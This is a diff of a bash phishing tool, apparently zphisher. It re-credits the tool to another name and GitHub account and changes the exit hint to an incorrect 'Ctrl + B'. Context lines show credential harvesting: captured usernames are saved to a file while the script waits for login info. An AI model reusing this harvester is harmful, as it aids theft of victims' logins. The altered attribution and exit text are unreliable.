@@ -39,7 +39,7 @@ printf "      \e[32;1m/_____| .__/|_| |_|_|___/_| |_|\___|_|   \e[0m\n"
 printf "      \e[33;1m      | |                                \e[0m\n"
 printf "      \e[33;1m      |_|           \e[1;97m    Version 2.1 Beta      \e[0m\n"
 printf "\n"
-printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by htr-tech (tahmid.rayat)\e[0m\n"
+printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by vijay (tahmid.rayat)\e[0m\n"
 printf "\n"
 
 }
@@ -271,7 +271,7 @@ elif [[ $menu_option == 99 ]]; then
 about
 elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
 printf "\e[0m\n"
-printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/htr-tech for more\e[0m\n"
+printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/kaulram for more\e[0m\n"
 printf "\e[0m\n"
 exit 1
 
@@ -416,7 +416,7 @@ banner
 printf "\e[0m\n"
 printf "\e[0m\e[92m  AUTHOR \e[0m\e[91m     :\e[0m\e[93m TAHMID RAYAT \e[0m\e[91m[\e[0m\e[93m HTR-TECH \e[0m\e[91m]\e[0m\n"
 printf "\e[0m\n"
-printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/htr-tech\e[0m\n"
+printf "\e[0m\e[92m  GITHUB \e[0m\e[91m     : \e[0m\e[96mhttps://github.com/kaulram\e[0m\n"
 printf "\e[0m\n"
 printf "\e[0m\e[92m  Social \e[0m\e[91m     : \e[0m\e[96mhttps://linktr.ee/tahmid.rayat\e[0m\n"
 printf "\e[0m\n"
@@ -439,7 +439,7 @@ menu
 elif [[ $about_option == 99 ]]; then
 sleep 1
 printf "\e[0m\n"
-printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/htr-tech for more\e[0m\n"
+printf " \e[0m\e[1;42m Thanks for Using This Tool !!\e[0m  \e[1;44m Visit https://github.com/kaulram for more\e[0m\n"
 printf "\e[0m\n"
 exit 1
 
@@ -586,14 +586,14 @@ cat .htr/www/usernames.txt >> usernames.dat
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m usernames.dat\e[0m\n"
 printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info,\e[0m\e[1;96m Ctrl + B to exit.\e[0m\n"
 
 }
 
 datafound() {
 
 printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + C to exit.\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Login Info,\e[0m\e[1;96m Ctrl + B to exit.\e[0m\n"
 printf "\n"
 while [ true ]; do
 
